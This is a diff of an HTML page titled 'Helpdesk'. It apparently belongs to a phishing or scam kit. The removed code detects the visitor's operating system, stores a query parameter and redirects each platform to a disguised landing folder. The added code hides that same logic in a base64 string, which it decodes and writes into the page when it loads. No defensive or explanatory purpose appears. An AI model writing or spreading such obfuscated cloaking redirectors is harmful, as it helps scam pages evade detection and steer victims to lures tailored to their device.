@@ -1,43 +1,28 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Helpdesk</title>
+    <title>Help</title>
     <script>
-        function getQueryParam(param) { 
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
-        function checkosSystemForScna() {
-            const userAgent = navigator.userAgent;
-            let os = "Unknown";
-            if (userAgent.indexOf("Win") !== -1) {
-                os = "Windows";
-            }else if (userAgent.indexOf("iPhone") !== -1) {
-                os = "iOS";
-            }else if (userAgent.indexOf("Mac") !== -1) {
-                os = "MacOS";
-            } else if (userAgent.indexOf("Android") !== -1) {
-                os = "Android";
-            } else if (userAgent.indexOf("Linux") !== -1) {
-                os = "Linux";
+        (function() {
+            var encrypted = 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhlbHA8L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiBnZXRRdWVyeVBhcmFtKHBhcmFtKSB7IAogICAgICAgICAgICBjb25zdCB1cmxQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOwogICAgICAgICAgICByZXR1cm4gdXJsUGFyYW1zLmdldChwYXJhbSk7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGNoZWNrb3NTeXN0ZW1Gb3JTY25hKCkgewogICAgICAgICAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogICAgICAgICAgICBsZXQgb3MgPSAiVW5rbm93biI7CiAgICAgICAgICAgIGlmICh1c2VyQWdlbnQuaW5kZXhPZigiV2luIikgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBvcyA9ICJXaW5kb3dzIjsKICAgICAgICAgICAgfWVsc2UgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCJpUGhvbmUiKSAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIG9zID0gImlPUyI7CiAgICAgICAgICAgIH1lbHNlIGlmICh1c2VyQWdlbnQuaW5kZXhPZigiTWFjIikgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBvcyA9ICJNYWNPUyI7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodXNlckFnZW50LmluZGV4T2YoIkFuZHJvaWQiKSAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIG9zID0gIkFuZHJvaWQiOwogICAgICAgICAgICB9IGVsc2UgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCJMaW51eCIpICE9PSAtMSkgewogICAgICAgICAgICAgICAgb3MgPSAiTGludXgiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBvczsKICAgICAgICB9CiAgICAgICAgbGV0IG9wZXJhdGluZ1N5c3RlbSA9IGNoZWNrb3NTeXN0ZW1Gb3JTY25hKCk7CiAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2FscGhhJyxnZXRRdWVyeVBhcmFtKCdhbHBoYScpKTsKICAgICAgICBpZihvcGVyYXRpbmdTeXN0ZW0gPT09ICdNYWNPUycpewogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0iTWVyeGlDMGRlaW5mb3VzYWh0bWwvaW5kZXguaHRtbD9iY2RhPSIrZ2V0UXVlcnlQYXJhbSgnYmNkYScpLnRyaW0oKTsKICAgICAgICB9ZWxzZSBpZihvcGVyYXRpbmdTeXN0ZW0gPT09ICdBbmRyb2lkJykgewogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0iYW5keDAxMHVzYWhUbWwvaW5kZXguaHRtbD9iY2RhPSIrZ2V0UXVlcnlQYXJhbSgnYmNkYScpLnRyaW0oKTsKICAgICAgICB9ZWxzZSBpZihvcGVyYXRpbmdTeXN0ZW0gPT09ICdpT1MnKSB7CiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSJpb3hzMDEwdXN4aFlNbC9pbmRleC5odG1sP2JjZGE9IitnZXRRdWVyeVBhcmFtKCdiY2RhJykudHJpbSgpOwogICAgICAgIH1lbHNlewogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0id2ViQzBkZWluZm91c2F2aHRtbC9pbmRleC5odG1sP2JjZGE9IitnZXRRdWVyeVBhcmFtKCdiY2RhJykudHJpbSgpOwogICAgICAgIH0KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4K';
+            
+            function decrypt(str) {
+                try {
+                    return atob(str);
+                } catch(e) {
+                    return '';
+                }
             }
-            return os;
-        }
-        let operatingSystem = checkosSystemForScna();
-        localStorage.setItem('alpha',getQueryParam('alpha'));
-        if(operatingSystem === 'MacOS'){
-            window.location.href="MerxiC0deinfousahtml/index.html?bcda="+getQueryParam('bcda').trim();
-        }else if(operatingSystem === 'Android') {
-            window.location.href="andx010usahTml/index.html?bcda="+getQueryParam('bcda').trim();
-        }else if(operatingSystem === 'iOS') {
-            window.location.href="ioxs010usxhYMl/index.html?bcda="+getQueryParam('bcda').trim();
-        }else{
-            window.location.href="webC0deinfousavhtml/index.html?bcda="+getQueryParam('bcda').trim();
-        }
+            
+            var decrypted = decrypt(encrypted);
+            if(decrypted) {
+                document.open();
+                document.write(decrypted);
+                document.close();
+            }
+        })();
     </script>
 </head>
 <body>
